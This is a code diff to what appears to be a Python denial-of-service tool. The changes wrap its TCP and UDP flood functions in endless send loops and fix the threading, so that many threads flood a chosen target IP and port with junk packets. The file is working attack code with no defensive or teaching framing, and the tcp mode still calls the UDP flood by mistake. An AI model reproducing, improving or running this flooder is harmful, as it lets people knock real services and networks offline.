@@ -25,15 +25,31 @@ class Dos():
         return size
 
     def tcp_flood(self, ip, port, buffer_size):
-        data = self.size(buffer_size)
-        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
-            sock.connect((ip, port))
-            sock.send(data)
+        while True:
+            try:
+                data = self.size(buffer_size)
+                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
+                    sock.connect((ip, port))
+                    sock.send(data)
+            except Exception:
+                print("Error")
+                continue
+            except KeyboardInterrupt:
+                print("Walhalle Closed - you pressed ctrl+c")
+                sys.exit(0)
 
     def udp_flood(self, ip, port, buffer_size):
-        data = self.size(buffer_size)
-        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
-            sock.sendto(data, (ip, port))
+        while True:
+            try:
+                data = self.size(buffer_size)
+                with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
+                    sock.sendto(data, (ip, port))
+            except Exception:
+                print("Error")
+                continue
+            except KeyboardInterrupt:
+                print("Walhalle Closed - you pressed ctrl+c")
+                sys.exit(0)
 
 class Controller(Dos):
 
@@ -92,23 +108,19 @@ class Controller(Dos):
             sys.exit(0)
 
     def threads(self, amount, dos_mode, target_ip, port, buffer_size):
-        while True:
-            if dos_mode == 'tcp':
-                self.dos = lambda t, p, b: self.udp_flood(target_ip, port, buffer_size)
-            elif dos_mode == 'udp':
-                self.dos = lambda t, p, b: self.udp_flood(target_ip, port, buffer_size)
-            for thread in range(int(amount)+1):
-                thread = Thread(self.dos(target_ip, port, buffer_size))
-                print("[{}] Starting Thread to target [{}]".format(thread, target_ip))
-                try:
-                    if thread.start():
-                        print("MODE: [{}] THREAD: [{}] » Sucessfully send packets with size [{}] to target [{}]".format(dos_mode, thread, buffer_size, target_ip))
-                except Exception:
-                    print("Error in [{}]".format(thread))
-                    continue
-                except KeyboardInterrupt:
-                    print("DDOS EXIT - you pressed ctrl+c")
-                    sys.exit(0)
+        if dos_mode == 'tcp':
+            self.dos = lambda t, p, b: self.udp_flood(target_ip, port, buffer_size)
+        elif dos_mode == 'udp':
+            self.dos = lambda t, p, b: self.udp_flood(target_ip, port, buffer_size)
+        for i in range(int(amount)+1):
+            thread = Thread(target=self.dos, args=(target_ip, port, buffer_size))
+            print("[{}] Starting Thread to target [{}]".format(thread, target_ip))
+            try:
+                if thread.start():
+                    print("MODE: [{}] THREAD: [{}] » Sucessfully started and sending packets with size [{}] to target [{}]".format(dos_mode, thread, buffer_size, target_ip))
+            except Exception:
+                print("Error in [{}]".format(thread))
+                continue
 
     def run(self):
         target_addr, port, dos_mode, amount, buffer_size = self.arguments()
